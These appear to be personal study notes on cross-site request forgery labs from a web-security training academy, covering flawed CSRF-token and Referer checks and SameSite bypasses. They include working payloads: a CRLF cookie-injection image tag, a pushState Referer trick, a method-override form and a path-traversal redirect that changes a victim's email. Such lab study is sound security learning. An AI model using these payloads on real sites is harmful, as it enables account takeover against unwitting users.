> Note
> 
> Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

### Validation of CSRF token depends on request method
Some applications correctly validate the token when the request uses the `POST` method but skip the validation when the `GET` method is used. 

### Validation of CSRF token depends on token being present
Some applications correctly validate the token when it is present but skip the validation if the token is omitted. 

### CSRF token is not tied to the user session
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. 

### CSRF token is tied to a non-session cookie
If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.  
The attacker can log in to the application using their own account, obtain a valid csrf token and cookie that is associated with that csrf token, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

> Note: The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to place a cookie that is submitted to secure.normal-website.com. 

#### Lab: (see csrfNotTiedToSession.html)
There's an update email endpoint:
```
POST /email/change HTTP/1.1
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
Body: csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

Exploiting:
- Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the `csrfKey` cookie merely results in the `CSRF` token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
- Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
- Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted and the email in the second account is updated. 

So if we can put `csrfKey` cookie into victim's browser then we can change their email
- Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the response from the server contains: `Set-Cookie: LastSearchTerm=<whatever was put into the search input>; Secure; HttpOnly`. Since there is no check for whatever is returned as a response to Set-Cookie, the cookie will be injected into the victim user's browser. 

i.e. If can put the following into the victim's browser:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
Then the response from the server will be changed from this:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hoba; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3420
```
To this:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test%0d%0aSet-Cookie:%20csrfKey=isbL4U9B3oBTG7MakdcPCoJsrDFyWhoj%3b%20SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3420
```
And victim will be set with the cookie that we specified

### CSRF token is duplicated in a cookie
> Note: If confused look at the previous `CSRF token is tied to a non-session cookie`

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie

Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

### CSRF where Referer validation depends on header being present
Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. 

### CSRF with broken Referer validation
If Referer header does not contain `YOUR-LAB-ID.web-security-academy.net` then the csrf token is rejected. But the validation of that `Referer` header is done via `contains()` function. 
So if we try to send: `Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net` it is accepted.

Therefore if we include in our exploit:
```
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
```
`history.pushState` changes the current suburl to whatever is specified as the third argument of func call and therefore it changes the Referer and it becomes `https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net`

> Note: Many browsers now strip the query string from the Referer header by default.
> You can override this behavior by making sure that the response from the server that contains your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string. 

## Bypassing SameSite cookie restrictions
`Lax` SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:
- The request uses the `GET` method.
- The request resulted from a top-level navigation by the user, such as clicking on a link.

### Bypassing SameSite Lax restrictions using GET requests
In practice, servers aren't always fussy about whether they receive a GET or POST request to a given endpoint.
We can try to change POST to GET

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. 
For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes: 
```
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
**Other frameworks support a variety of similar parameters.** 

### SameSite Strict bypass via client-side redirect
**Always search for `window.location`, `document.location` or `location` objects in javascript files.**

Let's say there's a post new comment url and after submitting that comment we are redirected to the following url:
```
GET /post/comment/confirmation?postId=7
```
After we're redirected to this confirmation page we can see there's a setTimeout between `<script>` tags:
```
setTimeout(() => {
     const url = new URL(window.location);
     const postId = url.searchParams.get("postId");
     window.location =  'post/' + postId;
}, 3000);
```
Which redirect back to the post page based on its id. e.g.:
```
https://lab-id.web-security-academy.net/post/7
```

The most interesting here is:
```
window.location = 'post/' + postId;
```
We have an email change endpoint which originally was a POST req but we tried and it turns out it can be change to GET and it'll update email anyway.
```
GET /my-account/change-email?email=ff%40ff.com&submit=1
```
So we can do the following: (notice: %2e%2e%2f (which is ../) after postId, this is needed because inside of setTimeout we have 'post/' + postId)
```
document.location = "https://lab-id.web-security-academy.net/post/comment/confirmation?postId=%2e%2e%2fmy-account%2fchange-email%3femail%3danna333%40ff.com%26submit%3d1"
```
And that will update the email


